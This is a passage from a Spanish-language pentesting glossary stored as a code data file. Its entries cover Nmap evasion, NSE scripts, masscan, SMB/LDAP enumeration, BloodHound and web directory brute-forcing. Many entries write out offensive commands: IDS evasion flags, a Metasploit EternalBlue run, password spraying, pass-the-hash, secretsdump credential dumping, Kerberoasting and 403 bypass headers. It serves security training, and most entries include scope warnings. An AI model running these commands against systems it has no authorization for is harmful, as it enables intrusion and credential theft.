      "> ⚠️ Ningún método es infalible contra un IDS moderno; reducen pero no eliminan la huella.",
    examples: [
      "-T2 para un escaneo lento que no destaca en los logs.",
      "-D para esconder la IP real entre señuelos.",
    ],
    related: ["Tipos de escaneo Nmap", "Detección de anomalías en tráfico", "Reconocimiento pasivo vs activo"],
  },
  {
    id: 294,
    module: 26,
    term: "NSE (Nmap Scripting Engine) avanzado",
    short: "600+ scripts Lua categorizados (safe/intrusive/vuln) que convierten Nmap en scanner de vulnerabilidades. Categorías, args y custom scripts.",
    detail:
      "El **NSE** convierte Nmap de un port scanner a un framework de reconocimiento activo. Los scripts viven en `/usr/share/nmap/scripts/` (~600 en Nmap 7.94).\n" +
      "\n**Categorías (organizadas por comportamiento):**\n" +
      "| Categoría | Qué hace | Ejemplo |\n" +
      "|---|---|---|\n" +
      "| `safe` | No modifica ni crashea target | `http-title`, `ssh-hostkey` |\n" +
      "| `default` (`-sC`) | Corre en cada scan por default | `banner`, `http-methods` |\n" +
      "| `discovery` | Enumeración adicional | `dns-brute`, `smb-enum-shares` |\n" +
      "| `version` | Detección precisa de versión | `http-server-header` |\n" +
      "| `vuln` | Chequea CVEs conocidos (activo) | `http-shellshock`, `smb-vuln-ms17-010` |\n" +
      "| `intrusive` | Puede crashear/DoS | `mysql-brute`, `smb-check-vulns` |\n" +
      "| `brute` | Bruteforce credentials | `ssh-brute`, `http-form-brute` |\n" +
      "| `exploit` | Ejecuta payload real | `smb-vuln-ms08-067` |\n" +
      "| `malware` | Detecta backdoors conocidos | `ftp-vuln-cve2010-4221` |\n" +
      "\n**Sintaxis:**\n" +
      "```bash\n# Categorías\nnmap --script=safe target                         # todos los safe\nnmap --script=default,discovery target            # combinado\nnmap --script=\"not intrusive\" target              # exclude\n\n# Específicos\nnmap --script=smb-vuln-ms17-010 -p 445 target\nnmap --script=http-enum -p 80,443 target\n\n# Con args\nnmap --script=http-enum --script-args=http-enum.basepath='/api/' target\n```\n" +
      "\n**Scripts críticos por vector:**\n" +
      "```\nsmb-vuln-ms17-010          # EternalBlue (WannaCry)\nsmb-vuln-ms08-067          # Conficker (2008 pero aún se ve)\nssl-heartbleed             # CVE-2014-0160\nhttp-shellshock            # Bash CVE-2014-6271\nhttp-vuln-cve2017-5638     # Struts2 RCE (Equifax)\nvulners                    # busca CVEs de todas las versiones detectadas\n```\n" +
      "\n**Custom scripts (Lua):**\n" +
      "```lua\n-- /usr/share/nmap/scripts/mi-check.nse\ndescription = [[Verifica header X-Powered-By]]\nauthor = \"tuyo\"\nlicense = \"MIT\"\ncategories = {\"safe\", \"discovery\"}\n\nrequire \"http\"\nportrule = shortport.port_or_service({80, 443}, {\"http\", \"https\"})\n\naction = function(host, port)\n  local response = http.get(host, port, \"/\")\n  return response.header[\"x-powered-by\"] or \"header ausente\"\nend\n```\n" +
      "Luego: `nmap --script=mi-check target`.\n" +
      "> 💡 **`vulners`** (comunidad) es de los más útiles: cross-referencia banners detectados con base CVE en tiempo real.\n" +
      "> ⚠️ Scripts `intrusive/brute/exploit` pueden bloquear cuentas, corromper datos o crashear servicios. Confirmar scope antes.",
    examples: [
      "`nmap -sV --script vuln -p- target` — barrido completo de vulnerabilidades.",
      "Enumeración de shares Windows: `nmap --script=smb-enum-shares -p 445 target`.",
      "Custom script para fingerprint de tecnología propia + integrar al pipeline de recon.",
    ],
    related: ["Tipos de escaneo Nmap", "Herramientas de enumeración", "Análisis de vulnerabilidades", "Firewall/IDS evasion con Nmap"],
  },
  {
    id: 295,
    module: 26,
    term: "Firewall/IDS evasion con Nmap",
    short: "Fragmentation, decoys, source port spoofing, timing lento, packet crafting. Cuando el target tiene defensas activas.",
    detail:
      "Un scan Nmap directo (`nmap -sS target`) es **muy visible**: un SYN por puerto, timing agresivo. Firewalls y IDS/IPS (Snort, Suricata) lo detectan trivialmente. Evasion es imprescindible en engagements realistas.\n" +
      "\n**Técnicas principales:**\n" +
      "\n**1. Fragmentation (`-f`, `--mtu N`)**\n" +
      "```bash\nnmap -f target                       # fragmenta a 8 bytes\nnmap --mtu 24 target                 # fragment size custom\n```\nEl paquete IP se divide en fragments pequeños. IDS antiguos con state limitado no lo reensamblan y solo ven fragments sueltos.\n" +
      "\n**2. Decoys (`-D`)**\n" +
      "```bash\nnmap -D RND:10 target                       # 10 decoys random\nnmap -D 1.2.3.4,5.6.7.8,ME,9.10.11.12 target # decoys específicos + IP real\n```\nEl target ve **múltiples IPs origen**, no sabe cuál es la real. **ME** especifica la posición de tu IP real en la lista.\n" +
      "\n**3. Source port spoof (`--source-port`, `-g`)**\n" +
      "```bash\nnmap --source-port 53 target         # tráfico aparenta ser DNS response\nnmap -g 80 target                    # aparenta ser HTTP\n```\nFirewalls mal configurados whitelist DNS/HTTP source ports permitiendo tráfico a través.\n" +
      "\n**4. Timing profiles (`-T0` a `-T5`)**\n" +
      "```bash\n-T0  # Paranoid: 5min entre paquetes — indetectable pero horas\n-T1  # Sneaky: 15s\n-T2  # Polite: 0.4s, menos ancho de banda\n-T3  # Normal (default)\n-T4  # Aggressive: rápido, ok en LAN\n-T5  # Insane: sacrifica precisión por velocidad\n```\nPara evadir IDS con thresholds, `-T1` o `-T2` diluye el scan.\n" +
      "\n**5. Spoof source IP (`-S`)**\n" +
      "```bash\nnmap -S 10.0.0.99 -e eth0 -Pn target\n```\nHace el scan aparente venir de otra IP. No obtenés respuestas directas (van a la IP spoofed) — útil solo para triggering.\n" +
      "\n**6. Idle scan (`-sI zombie`)**\n" +
      "El más stealth. Usa un **host zombie** con IPID sequence predecible como proxy indirecto. El target ve el scan del zombie, no de vos. Requiere encontrar zombie válido.\n" +
      "```bash\nnmap -sI zombie.example.com target\n```\n" +
      "\n**7. Data length + padding (`--data-length N`, `--data 0xDEADBEEF`)**\n" +
      "Cambia el tamaño/contenido del payload para evadir signatures de IDS.\n" +
      "\n**8. Fragmentación IP + reorder**\n" +
      "```bash\nnmap -f --mtu 8 --scan-delay 500ms target\n```\n" +
      "\n**9. TTL manipulation (`--ttl N`)**\n" +
      "Aparentar diferente distancia de red.\n" +
      "\n**IDS/IPS modernos (Suricata, Zeek, Snort 3):**\n" +
      "Detectan mucho de esto. La combinación `-f + -D + -T1 + -g 53` es un mejor baseline. Herramientas específicas: **Nmap NSE con --script=firewalk**, **hping3** para packet crafting custom.\n" +
      "> 💡 En engagement legal, **coordinar con el blue team** para no gastar horas de investigación por scans conocidos.\n" +
      "> ⚠️ Evasion no evade **network taps** o **passive monitoring** — solo IDS con reglas específicas.",
    examples: [
      "Combinación 'stealth': `nmap -sS -f -D RND:10 -T2 -g 53 --data-length 30 target`.",
      "Comparar scan-detection: hacer 2 scans (default vs stealth) y correr Suricata local para ver diff de alerts.",
      "En CTF/HTB: `-T4 -Pn` sin evasion (ya se sabe que hay scan) para ir rápido.",
    ],
    related: ["Tipos de escaneo Nmap", "NSE (Nmap Scripting Engine) avanzado", "Evasión de IDS/firewall", "Nmap performance tuning y masscan"],
  },
  {
    id: 296,
    module: 26,
    term: "Nmap performance tuning y masscan",
    short: "Cuando Nmap es demasiado lento (millones de IPs, /8), masscan/naabu/rustscan escanean a M packets/sec.",
    detail:
      "Nmap por defecto es **poderoso pero lento** en escala: un `-p-` (65535 puertos) por host lleva 10-30 min. Para escanear rangos grandes (`/16`, `/8`, IPv4 entero) hay herramientas específicas.\n" +
      "\n**Nmap tuning (para squeeze más velocidad):**\n" +
      "```bash\nnmap -T4 --min-parallelism 100 --max-retries 1 --host-timeout 30s --min-rate 300 -p- target\n```\n" +
      "| Flag | Efecto |\n" +
      "|---|---|\n" +
      "| `--min-rate N` | Fuerza mínimo N pkts/sec |\n" +
      "| `--max-retries N` | Reduce retries (default 10) |\n" +
      "| `--host-timeout Ns` | Skip host si tarda más de N seg |\n" +
      "| `--min-parallelism N` | Mínimo N conexiones paralelas |\n" +
      "| `--defeat-rst-ratelimit` | Ignorar rate-limit del target |\n" +
      "| `-Pn` | Skip host discovery (asume vivo) |\n" +
      "| `-n` | No DNS resolution |\n" +
      "\n**masscan — el rey de la velocidad:**\n" +
      "Creado por Robert Graham. Puede escanear **10M pkts/sec** en 10G ethernet con async I/O (no OS TCP stack).\n" +
      "```bash\nmasscan 0.0.0.0/0 -p 443 --rate 100000 --output-format json --output-filename https.json\nmasscan 10.0.0.0/8 -p 22,80,443,3389,8080 --rate 50000\n```\n" +
      "Escanear todo IPv4 en un puerto: ~6 min con 10G. Downsides:\n" +
      "• No hace service detection (solo status open/closed)\n" +
      "• Requiere ser cuidadoso con ISP (parece DDoS)\n" +
      "• Sintaxis en `-p 22` = puerto TCP solamente, `-pU:53` para UDP\n" +
      "\n**Pipeline moderno: masscan → nmap sV**\n" +
      "```bash\n# 1. Discovery ultra rápido\nmasscan 10.0.0.0/16 -p 1-65535 --rate 50000 -oL open-ports.txt\n\n# 2. Deep scan sobre lo encontrado\nnmap -sV -sC -p $(cat open-ports.txt | awk '{print $3}' | sort -u | tr '\\n' ',') -iL hosts.txt\n```\n" +
      "\n**rustscan** (2019, Rust):\n" +
      "```bash\nrustscan -a target -- -sV -sC       # deep scan de todo lo abierto\n```\nWrapper: descubre puertos rápido → pasa a Nmap para detalle. ~10× más rápido que Nmap solo.\n" +
      "\n**naabu (ProjectDiscovery, Go):**\n" +
      "```bash\nsubfinder -d target.com | naabu -p 80,443,8080,8443 -c 200\n```\nParte del pipeline recon → naabu → nuclei.\n" +
      "\n**zmap:**\n" +
      "Similar a masscan. Investigación académica (papers de mediciones IPv4).\n" +
      "> 💡 **En OSCP time-boxed**, un pipeline masscan (30s) → nmap sobre open ports (2min) es superior a nmap sV solo (15min).\n" +
      "> ⚠️ Escaneos masivos disparan alertas ISP. Usar sólo en scope de bug bounty explícito o con permiso del provider.",
    examples: [
      "IPv4 escaneo total port 443: masscan --rate 100000 en 6-10 min.",
      "OSCP recon: `rustscan -a $ip --ulimit 5000 -- -sV -sC -oA nmap` como comando único.",
      "ProjectDiscovery pipeline: `subfinder | dnsx | naabu | httpx | nuclei`.",
    ],
    related: ["Tipos de escaneo Nmap", "Firewall/IDS evasion con Nmap", "Subdomain enumeration moderno (amass, subfinder, crt.sh)", "NSE (Nmap Scripting Engine) avanzado"],
  },
  {
    id: 297,
    module: 26,
    term: "UDP scanning avanzado y specialty scans",
    short: "UDP es lento (10× TCP) por diseño del protocolo. Estrategias para hacerlo viable + otros scan types específicos.",
    detail:
      "**UDP scanning** es el punto ciego más común. Muchos servicios críticos (DNS 53, SNMP 161, NTP 123, TFTP 69, NetBIOS 137, IKE 500) son UDP. Pero UDP no tiene handshake — la detección es indirecta y lenta.\n" +
      "\n**Por qué UDP es difícil:**\n" +
      "| Estado | TCP | UDP |\n" +
      "|---|---|---|\n" +
      "| Open | SYN-ACK | Response de la app (a veces) |\n" +
      "| Closed | RST | ICMP Port Unreachable |\n" +
      "| Filtered | Sin response | Sin response |\n" +
      "\n**Open|filtered** — el UDP tiene esa ambigüedad. Sin response puede ser open (app no responde) o filtered (firewall). Nmap intenta payloads específicos por puerto (`nmap-payloads`) para forzar respuesta:\n" +
      "```\nSNMP (161): manda GET-Request con community 'public'\nDNS (53): manda query DNS estándar\nNetBIOS (137): manda NBSTAT request\n```\n" +
      "\n**Estrategia UDP inteligente:**\n" +
      "```bash\n# Solo top 100 UDP ports (más comunes)\nnmap -sU --top-ports 100 -T4 target\n\n# Específicos con scripts\nnmap -sU -p 53,161,123,500 --script=snmp-info,dns-brute target\n\n# Combined con TCP en un solo comando\nnmap -sS -sU -p T:22,80,443,U:53,161,500 target\n```\n" +
      "\n**ICMP rate-limiting** — Linux rate-limita ICMP Port Unreachable (1 pkt/sec por default). Un scan UDP full contra Linux **puede tardar 18 horas**. Fix: usar `--min-rate` + `--defeat-icmp-ratelimit`.\n" +
      "\n**Specialty scans útiles:**\n" +
      "\n**ACK scan (`-sA`)** — no descubre puertos abiertos, sino **firewalls stateful**. Los puertos que responden RST son 'unfiltered' (probablemente sin firewall). Los que no responden son 'filtered'.\n" +
      "\n**Window scan (`-sW`)** — como ACK pero interpreta TCP Window field. Algunos sistemas mandan window >0 en open ports, =0 en closed.\n" +
      "\n**Maimon scan (`-sM`)** — FIN+ACK. Bypass de firewalls antiguos.\n" +
      "\n**NULL scan (`-sN`), FIN scan (`-sF`), Xmas scan (`-sX`)** — packet crafting no-standard. Puede evadir stateless firewalls. Windows no responde estrictamente al RFC → no funciona bien contra Windows.\n" +
      "\n**Idle scan (`-sI`)** — el más stealth: usa un zombie con IPID predecible como proxy.\n" +
      "\n**Protocol scan (`-sO`)** — enumera qué **protocolos IP** (no puertos) están soportados (TCP=6, UDP=17, ICMP=1, GRE=47, IPSec ESP=50).\n" +
      "\n**Traceroute (`--traceroute`)**\nMapea el path de red. Útil para identificar firewalls intermedios y CDNs.\n" +
      "> 💡 En pentest interno con acceso local: UDP scan crítico revela servicios (SNMP con community 'public' es hallazgo dorado — vuelca toda la MIB).\n" +
      "> ⚠️ SNMP UDP scans con `snmp-brute` NSE pueden crashear equipos legacy. Verificar scope.",
    examples: [
      "SNMP hallazgo clásico: `nmap -sU -p 161 --script=snmp-info,snmp-brute,snmp-processes target`.",
      "ACK scan para firewall mapping: `nmap -sA -p- target` — puertos 'unfiltered' señalan la política del firewall.",
      "Idle scan con zombie descubierto: `nmap -sI 192.168.1.100 target` — el target ve el zombie, no vos.",
    ],
    related: ["Tipos de escaneo Nmap", "Herramientas de enumeración", "Firewall/IDS evasion con Nmap", "NSE (Nmap Scripting Engine) avanzado"],
  },
  {
    id: 298,
    module: 26,
    term: "Nmap output parsing y automation",
    short: "XML output + herramientas como nmaptocsv, dnmap, o pipe a nuclei/httpx. Convertir recon en workflow reproducible.",
    detail:
      "En engagements reales, Nmap es **una etapa** del pipeline, no el resultado final. Automatizar output → siguientes tools es la diferencia entre 'pentest manual' y 'ops team'.\n" +
      "\n**Formatos de output:**\n" +
      "```bash\nnmap -sV target -oN normal.txt      # human readable\nnmap -sV target -oX result.xml       # XML (parseable)\nnmap -sV target -oG grep.txt         # grepable (una línea por host)\nnmap -sV target -oA scan             # normal + xml + grep (recomendado)\nnmap -sV target -oJ output.json      # JSON (Nmap 7.90+, requires libjq)\n```\n" +
      "\n**Parsear XML — patrón canónico Python:**\n" +
      "```python\nimport xml.etree.ElementTree as ET\ntree = ET.parse('scan.xml')\nroot = tree.getroot()\nfor host in root.findall('host'):\n    addr = host.find('address').get('addr')\n    for port in host.findall('.//port'):\n        state = port.find('state').get('state')\n        if state == 'open':\n            service = port.find('service').get('name', 'unknown')\n            print(f'{addr}:{port.get(\"portid\")} {service}')\n```\n" +
      "\n**Herramientas de parsing:**\n" +
      "• **nmaptocsv** — XML → CSV para spreadsheets/reports.\n" +
      "• **Metasploit `db_import`** — importa XML directo a la DB de MSF.\n" +
      "• **NmapParser** (Perl) — históricamente popular.\n" +
      "• **python-libnmap** — parser Python maduro.\n" +
      "\n**Pipelines de ProjectDiscovery:**\n" +
      "```bash\n# Full recon pipeline\nsubfinder -d target.com -silent | \\\n  dnsx -a -resp-only | \\\n  naabu -p 80,443,8080,8443,3000,3306,6379,27017 -silent | \\\n  httpx -status-code -tech-detect -title -silent | \\\n  tee alive.txt | \\\n  nuclei -t cves/ -severity critical,high\n```\n" +
      "\n**Nmap → Metasploit workflow:**\n" +
      "```\n# En msfconsole\nmsf6 > db_import /tmp/scan.xml\nmsf6 > services -p 445    # todos los hosts con SMB\nmsf6 > vulns              # vulns detectadas por scripts\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set RHOSTS file:hosts.txt\nmsf6 > run\n```\n" +
      "\n**Ndiff — diffing entre scans:**\n" +
      "```bash\nnmap -sV target -oX today.xml\n# ...un día después...\nnmap -sV target -oX tomorrow.xml\nndiff today.xml tomorrow.xml  # muestra qué cambió\n```\nUseful para monitoring: nuevos puertos, servicios que cambiaron.\n" +
      "\n**Zenmap (GUI):**\nFrontend gráfico de Nmap. Útil para presentaciones/clientes no técnicos que quieren ver la topología.\n" +
      "\n**dnmap** — Distributed Nmap: divide un scan grande entre múltiples workers.\n" +
      "> 💡 **Guardar SIEMPRE -oA en engagements** — el XML es tu evidence para el report y para chaining.\n" +
      "> ⚠️ Los timestamps en XML importan legalmente en un pentest report. Preservar tal cual, no editar.",
    examples: [
      "`nmap -sV -sC -oA baseline target` + versionar en git para monitorear infra propia.",
      "ndiff comparativa mensual: detecta drift de configuración.",
      "Pipeline recon-full.sh de OWASP Amass integrado con Nmap XML.",
    ],
    related: ["Tipos de escaneo Nmap", "NSE (Nmap Scripting Engine) avanzado", "Nmap performance tuning y masscan", "Arquitectura de Metasploit"],
  },

  // ── M27 · Enumeración de Servicios ───────────────────────────────────────
  {
    id: 300,
    module: 27,
    term: "Enumeración SMB y NetBIOS",
    short: "SMB suele filtrar shares, usuarios y políticas; un clásico punto de entrada.",
    detail:
      "**SMB** (puertos 445/139) es una mina de información en redes Windows: shares accesibles, usuarios, políticas de contraseña. Herramientas: **enum4linux**, **smbclient**, **crackmapexec**.\n" +
      "enum4linux -a 10.0.0.10\n" +
      "> ⚠️ Shares con **null session** (sin credenciales) son hallazgos frecuentes y graves.",
    examples: [
      "smbclient -L //10.0.0.10 lista los shares.",
      "crackmapexec smb para spray de credenciales en la red.",
    ],
    related: ["Herramientas de enumeración", "DNS zone transfer", "Active Directory: dominio, bosque y OU"],
  },
  {
    id: 301,
    module: 27,
    term: "DNS zone transfer",
    short: "Un servidor DNS mal configurado entrega todos sus registros de golpe.",
    detail:
      "Una **transferencia de zona (AXFR)** está pensada para replicar entre servidores DNS, pero si está abierta a cualquiera, revela **todo el mapa interno** (hostnames, IPs, subdominios).\n" +
      "dig axfr ejemplo.com @ns1.ejemplo.com\n" +
      "> 💡 Es de los primeros checks de enumeración: regala el inventario de la red.",
    examples: [
      "Un AXFR exitoso lista servidores internos no públicos.",
      "Mitigación: restringir AXFR a IPs de servidores secundarios.",
    ],
    related: ["DNS", "Enumeración SMB y NetBIOS", "Enumeración SNMP y LDAP"],
  },
  {
    id: 302,
    module: 27,
    term: "Enumeración SNMP y LDAP",
    short: "SNMP y LDAP exponen inventario de dispositivos y estructura del directorio.",
    detail:
      "• **SNMP** (UDP/161) con la *community string* por defecto (`public`) filtra interfaces, procesos y rutas.\n" +
      "• **LDAP** (389/636) permite enumerar usuarios, grupos y la estructura de Active Directory.\n" +
      "snmpwalk -v2c -c public 10.0.0.20\n" +
      "ldapsearch -x -h 10.0.0.10 -b \"dc=corp,dc=local\"",
    examples: [
      "snmpwalk con community 'public' lista la config del router.",
      "ldapsearch enumera cuentas del dominio.",
    ],
    related: ["Enumeración SMB y NetBIOS", "LDAP", "Herramientas de enumeración"],
  },
  {
    id: 303,
    module: 27,
    term: "Herramientas de enumeración",
    short: "enum4linux, rpcclient, gobuster, nikto: el arsenal para sonsacar servicios.",
    detail:
      "Cada protocolo tiene su herramienta:\n" +
      "• **enum4linux / rpcclient** — SMB/MSRPC (usuarios, shares).\n" +
      "• **gobuster / ffuf** — fuzzing de directorios y subdominios web.\n" +
      "• **nikto** — escáner de problemas web conocidos.\n" +
      "• **crackmapexec** — enumeración y spray en redes AD.\n" +
      "gobuster dir -u http://10.0.0.5 -w wordlist.txt",
    examples: [
      "gobuster descubriendo /admin oculto.",
      "rpcclient -U '' para una sesión nula contra SMB.",
    ],
    related: ["Enumeración SMB y NetBIOS", "Enumeración SNMP y LDAP", "Análisis de vulnerabilidades"],
  },
  {
    id: 304,
    module: 27,
    term: "SMB enumeration profundo con CrackMapExec/NetExec",
    short: "SMB es la mina de oro del pentest interno. CrackMapExec y su fork NetExec automatizan RID cycling, spidering, credential validation en masa.",
    detail:
      "**SMB** (puerto 445, TCP) es el pentest goldmine en redes Windows/AD. Un misconfig típico expone shares, permite null sessions y filtra usuarios. Herramientas modernas:\n" +
      "\n**enum4linux-ng** (rewrite en Python del clásico):\n" +
      "```bash\nenum4linux-ng -A target                # todo: users, shares, groups, OS\nenum4linux-ng -u admin -p pass target  # con creds\n```\n" +
      "\n**CrackMapExec (CME) / NetExec (NXC, fork mantenido desde 2023):**\nEl swiss-army knife del pentest AD. Módulos para SMB, WinRM, MSSQL, LDAP, SSH, RDP.\n" +
      "```bash\n# Validar creds en masa contra 254 hosts\nnxc smb 192.168.1.0/24 -u users.txt -p passwords.txt\n\n# Null session enumeration\nnxc smb 192.168.1.0/24 -u '' -p ''\n\n# Shares accesibles (spider)\nnxc smb target -u user -p pass --shares\nnxc smb target -u user -p pass --spider SYSVOL\n\n# Password policy + logged-on users\nnxc smb target -u user -p pass --pass-pol --loggedon-users\n\n# Passing hash (post-mimikatz)\nnxc smb target -u admin -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n```\n" +
      "\n**RID cycling — enumerar usuarios sin creds:**\n" +
      "SMB null sessions permiten iterar RIDs (Relative Identifier) del dominio: RID 500 = Administrator, 501 = Guest, 1000+ = users creados.\n" +
      "```bash\nnxc smb target -u '' -p '' --rid-brute 3000\nimpacket-lookupsid anonymous@target\n```\n" +
      "\n**SMB signing check:**\n" +
      "```bash\nnxc smb 192.168.1.0/24 --gen-relay-list relay-targets.txt\n```\nHosts con signing:False son candidatos a **NTLM relay** (impacket-ntlmrelayx).\n" +
      "\n**Password spraying:**\n" +
      "```bash\nnxc smb 192.168.1.0/24 -u users.txt -p 'Winter2024!' --continue-on-success\n```\n1 password × muchos users evita lockouts. Común en pentest inicial.\n" +
      "\n**Impacket suite** (complementaria):\n" +
      "```bash\nsmbclient.py user:pass@target                      # cliente SMB\nsmbmap -H target -u user -p pass                   # rápido share enum\ngetuserspn.py DOMAIN/user:pass -dc-ip 10.0.0.1     # Kerberoasting\nGetNPUsers.py DOMAIN/ -dc-ip 10.0.0.1 -usersfile users.txt  # AS-REP roast\nsecretsdump.py DOMAIN/admin:pass@target            # dump SAM/NTDS\n```\n" +
      "\n> 💡 **NetExec (nxc)** reemplazó a CME en 2023 tras que el creator abandonó. Todos los tutoriales viejos con `crackmapexec` ahora usan `nxc`.\n" +
      "> ⚠️ Password spraying con >1 password/hora dispara account lockouts. Verificar policy con `--pass-pol` antes.",
    examples: [
      "Blackhat 2015: talk seminal de CME. Convirtió pentest de AD en workflow.",
      "OSCP típico: `nxc smb 10.10.10.0/24 -u users.txt -p 'Password1' --continue-on-success` primer intento.",
      "Impacket ntlmrelayx: relay NTLM auth de un share vulnerable a LDAP → agregar admin al dominio.",
    ],
    related: ["Enumeración SMB y NetBIOS", "LDAP enumeration y BloodHound", "AAA (Autenticación, Autorización, Accounting)", "Active Directory: dominio, bosque y OU"],
  },
  {
    id: 305,
    module: 27,
    term: "LDAP enumeration y BloodHound",
    short: "LDAP filtra queries al AD; BloodHound convierte esa data en grafo de attack paths. La herramienta que redefinió el pentest de AD.",
    detail:
      "En Active Directory, cada usuario, grupo, computadora y OU es un objeto LDAP. Un usuario del dominio (incluso sin privilegios) puede **consultar el 90% del AD** por diseño (LDAP anonymous bind menos común, pero authenticated bind estándar).\n" +
      "\n**ldapsearch básico:**\n" +
      "```bash\nldapsearch -H ldap://dc.corp.local -x -D 'user@corp.local' -w 'pass' \\\n  -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName memberOf\n```\n" +
      "\n**Consultas críticas:**\n" +
      "```\n(sAMAccountName=*)                          # todos los usuarios\n(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local)  # DAs\n(userAccountControl:1.2.840.113556.1.4.803:=8192)  # DCs (SERVER_TRUST_ACCOUNT)\n(userAccountControl:1.2.840.113556.1.4.803:=4194304) # AS-REP roastable (DONT_REQ_PREAUTH)\n(servicePrincipalName=*)                    # Kerberoastable\n```\n" +
      "\n**BloodHound — el game-changer (2016):**\n" +
      "\nRecolecta data del AD y la modela en **Neo4j** como grafo (nodos = users/computers/groups, edges = permisos/sesiones/memberships). Después consulta:\n" +
      "```cypher\n// Shortest path desde 'user@corp.local' a Domain Admins\nMATCH p = shortestPath((u:User {name:'USER@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}))\nRETURN p\n```\n" +
      "\n**Collectors:**\n" +
      "• **SharpHound.exe** (C#) — más features, para Windows compromise\n" +
      "• **BloodHound.py** (bloodhound-python) — para Kali/Linux\n" +
      "• **AzureHound** — para Entra ID / Azure\n" +
      "\n```bash\n# Collection desde Linux\nbloodhound-python -c All -u user -p pass -d corp.local -ns 10.0.0.1\n# Salidas: .json files → importar en BloodHound GUI\n\n# SharpHound.exe (necesita estar en la red)\n.\\SharpHound.exe -c All\n```\n" +
      "\n**Attack paths automáticos que BloodHound muestra:**\n" +
      "• `Kerberoastable users to Domain Admin`\n" +
      "• `Find all AS-REP roastable users`\n" +
      "• `Find shortest path to Domain Admins from owned principal`\n" +
      "• `Groups where owned user is member with DCSync rights`\n" +
      "\n**Ataques comunes derivados de BloodHound findings:**\n" +
      "• **Kerberoasting** — user con SPN → GetUserSPNs → offline crack de TGS.\n" +
      "• **AS-REP roasting** — user con DONT_REQ_PREAUTH → GetNPUsers → offline crack.\n" +
      "• **DCSync** — user con Replicating Directory Changes → secretsdump → dump hashes.\n" +
      "• **Unconstrained Delegation** — computer con TrustedForDelegation → tgts en memoria → coerción.\n" +
      "\n**BloodHound Community Edition (2023)** integra collector + GUI en una app. La versión legacy (Neo4j separado) sigue en uso.\n" +
      "\n> 💡 En pentest AD moderno, **BloodHound es la primera herramienta post-initial-access**. Antes de correr exploits, mapea el grafo.\n" +
      "> ⚠️ SharpHound genera **ruido masivo** en el AD (miles de LDAP queries). Blue teams lo detectan con reglas específicas. Usar `-c Session,LocalGroup` para modo stealth.",
    examples: [
      "SpecterOps (creadores de BloodHound) publican queries custom mensualmente para ATT&CK path finding.",
      "Rubeus + BloodHound: identificar user Kerberoastable → GetSPN → hashcat → propietario de DA.",
      "En engagement real, un attack path típico son 3-5 hops desde user normal a DA.",
    ],
    related: ["Enumeración SNMP y LDAP", "SMB enumeration profundo con CrackMapExec/NetExec", "Active Directory: dominio, bosque y OU", "AAA (Autenticación, Autorización, Accounting)"],
  },
  {
    id: 306,
    module: 27,
    term: "HTTP directory bruteforcing moderno (ffuf, feroxbuster)",
    short: "gobuster clásico, ffuf (más rápido, más flexible) y feroxbuster (recursion + smart-detection) para descubrir endpoints ocultos.",
    detail:
      "Descubrir directorios/archivos ocultos en web apps es un vector primario para encontrar admin panels, backups, APIs internas. El moderno stack:\n" +
      "\n**ffuf (Fuzz Faster U Fool, Go, 2018):**\nEl más flexible. Soporta fuzzing de path, subdominios, headers, POST body, params.\n" +
      "```bash\n# Directory fuzzing\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -u https://target.com/FUZZ -mc 200,301,302 -recursion -recursion-depth 2\n\n# Virtual host discovery\nffuf -w subdomains.txt -u https://target.com -H 'Host: FUZZ.target.com' \\\n  -fs 4242    # filtrar response size igual\n\n# Parameter discovery\nffuf -w params.txt -u 'https://target.com/api?FUZZ=x' -fs 1234\n\n# POST body brute (login)\nffuf -w users.txt:U -w passes.txt:P -X POST \\\n  -d 'user=U&pass=P' -u https://target.com/login -fr 'invalid'\n\n# Recursion inteligente\nffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -recursion-depth 3\n```\n" +
      "\n**feroxbuster (Rust, 2020):**\nRecursion automática + filtros heurísticos. Más rápido en escenarios profundos.\n" +
      "```bash\nferoxbuster -u https://target.com -w wordlist.txt -x php,html,txt --depth 4\nferoxbuster -u https://target.com --auto-tune  # ajusta rate al target\n```\n" +
      "\n**dirsearch (Python, más simple para OSCP):**\n" +
      "```bash\ndirsearch -u https://target.com -e php,html,txt,bak,zip,sql -w wordlist.txt\n```\n" +
      "\n**Wordlists (SecLists es el estándar):**\n" +
      "```\n/usr/share/seclists/Discovery/Web-Content/\n├── raft-medium-directories.txt         # dirs comunes ~30k\n├── raft-medium-files.txt               # archivos ~30k\n├── common.txt                          # dirs top ~4600\n├── big.txt                             # dirs enormes ~20k\n├── directory-list-2.3-medium.txt       # de dirbuster clásico\n└── api/                                # endpoints REST/GraphQL específicos\n```\n" +
      "\n**Tech fingerprinting:**\n" +
      "• **whatweb** — identifica tech stack por banners/patterns\n" +
      "• **wappalyzer** (CLI wappalyzergo) — extensa DB\n" +
      "• **httpx -tech-detect** — ProjectDiscovery, integra con pipeline\n" +
      "```bash\nsubfinder -d target.com | httpx -tech-detect -status-code\n```\n" +
      "\n**403 bypass techniques:**\nCuando un endpoint devuelve 403, probar:\n" +
      "```\n/admin       → 403\n/admin/      → 200 (trailing slash)\n/admin/.     → 200\n/admin;/     → 200 (URL truncation)\nX-Original-URL: /admin       → header injection\nX-Forwarded-For: 127.0.0.1   → localhost trust\n```\nHerramienta: **bypass-url-parser**, **4-ZERO-3**.\n" +
      "\n**Vhost/subdomain discovery via HTTP:**\nMuchas apps sirven contenido diferente según `Host:` header. Enumerar con ffuf `-H 'Host: FUZZ.target.com'`.\n" +
      "> 💡 **Recursion + inteligente extension list** hace ffuf superior a gobuster clásico.\n" +
      "> ⚠️ Wordlists grandes contra un target lento = horas. Combinar rate-limit (`-rate 50`) con `--auto-tune`.",
    examples: [
      "Encontrar `/backup.zip`: `ffuf -w common.txt -u https://target.com/FUZZ -e '.zip,.bak,.sql'`.",
      "Descubrir API v2 oculta: `ffuf -w api-endpoints.txt -u https://target.com/api/v2/FUZZ`.",
      "Bypass 403 con `curl -H 'X-Original-URL: /admin' https://target.com/`.",
    ],
    related: ["Herramientas de enumeración", "OWASP Top 10", "OWASP Top 10", "Subdomain enumeration moderno (amass, subfinder, crt.sh)"],
  },
  {
    id: 307,
    module: 27,
